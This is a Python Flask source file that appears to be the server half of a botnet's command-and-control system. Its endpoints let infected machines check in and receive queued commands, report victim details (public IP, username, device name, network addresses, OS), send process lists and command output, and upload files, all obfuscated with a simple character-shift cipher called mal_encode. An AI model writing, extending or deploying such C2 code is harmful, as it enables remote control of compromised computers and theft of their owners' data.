import os

from flask import request
import flask
from werkzeug.utils import secure_filename

from sqlweb.app import app
from sqlweb.app import get_db
from sqlweb import dbmain
import time
import datetime
import uuid


def mal_encode(key, clear):
    enc = ""
    for i in range(0, len(clear)):
        key_c = key[i % len(key)]
        placeholder = ord(clear[i]) + ord(key_c)
        enc_c = placeholder % 127
        enc += chr(enc_c)
    return enc


def mal_decode(key, enc):
    dec = ""
    for i in range(0, len(enc)):
        key_c = key[i % len(key)]
        placeholder = 127 + (enc[i]) - ord(key_c)
        dec_c = (placeholder % 127)
        dec += chr(dec_c)
    return dec


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Beacon heartbeat endpoint
    Used by the bot to check in and get additional commands
    If there are no commands to execute, returns "1" (OK/NOP)
    Uses X-Session-ID cookie as a bot UUID

    :return: command for bot to execute
    """
    if request.method == 'POST':
        conn = get_db()
        checkin = int(time.time())

        if 'X-Session-ID' not in request.cookies:
            print("New checkin at " + str(checkin))
            resp = flask.Response(mal_encode(app.malware_key, str(checkin)))
            bot_id = uuid.uuid1()
            print("Adding new UUID to db:" + str(bot_id))
            resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
            dbmain.add_bot_to_db(conn, str(bot_id), checkin)
            return resp
        else:
            id = request.cookies['X-Session-ID']
            dbmain.add_bot_to_db(conn, id, checkin)
            dbmain.checkin(conn, id)
            dbmain.get_bot_info(conn, id)
            command = dbmain.get_bot_commandqueue(conn, id)[0]
            if command != "":
                dbmain.update_commandqueue(conn, id, "")
                return mal_encode(app.malware_key, command)
        return mal_encode(app.malware_key, "1")


@app.route('/info', methods=['POST'])
def info():
    """
    Endpoint for receiving info from bot and updating record in DB
    Order: public IP, username, device-name, region, memory amount, network_addresses (comma delimited)
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            id = request.cookies['X-Session-ID']
            d = mal_decode(app.malware_key, request.data)
            conn = get_db()

            spltdata = d.split('&')
            dbmain.update_ip(conn, id, spltdata[0])
            dbmain.update_username(conn, id, spltdata[1])
            dbmain.update_devicename(conn, id, spltdata[2])
            dbmain.update_region(conn, id, spltdata[3])
            dbmain.update_memory(conn, id, spltdata[4])
            dbmain.update_networkaddresses(conn, id, spltdata[5])
            dbmain.update_os(conn, id, spltdata[6])
            return mal_encode(app.malware_key, "Success")

@app.route('/ps', methods=['POST'])
def ps():
    """
    Endpoint for &-delimited process list
    Updates list in DB accordingly
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            conn = get_db()
            proc_string = mal_decode(app.malware_key, request.data)
            dbmain.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
            return mal_encode(app.malware_key, "Successfully updated process list")


@app.route('/upload', methods=['POST'])
def upload():
    """
    Endpoint for file uploads
    Takes file named "file" and writes it to upload directory\sessionid\timestamp_filename
    :return:
    """
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files or 'X-Session-ID' not in request.cookies:
            return mal_encode(app.malware_key, "Error with file upload")
        file = request.files['file']
        # if user does not select file, browser also submit an empty part without filename
        if file.filename == '':
            print('No selected file')
            return mal_encode(app.malware_key, "Error with file upload")
        if file:
            filename = secure_filename(str(int(time.time())) + "_" + file.filename)
            cookiename = secure_filename(request.cookies['X-Session-ID'])
            dir = app.config['UPLOAD_FOLDER'] + os.sep + cookiename
            if not os.path.exists(dir):
                os.makedirs(dir)
            file.save(os.path.join(dir, filename))
            return mal_encode(app.malware_key, "Successfully uploaded file")
    return mal_encode(app.malware_key, "Something went wrong")


@app.route('/out', methods=['POST'])
def out():
    """
    Endpoint for command output
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            return mal_encode(app.malware_key, "Error: no cookie")
        else:
            conn = get_db()
            out_string = mal_decode(app.malware_key, request.data)
            dbmain.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
            return mal_encode(app.malware_key, "Output updated successfully")



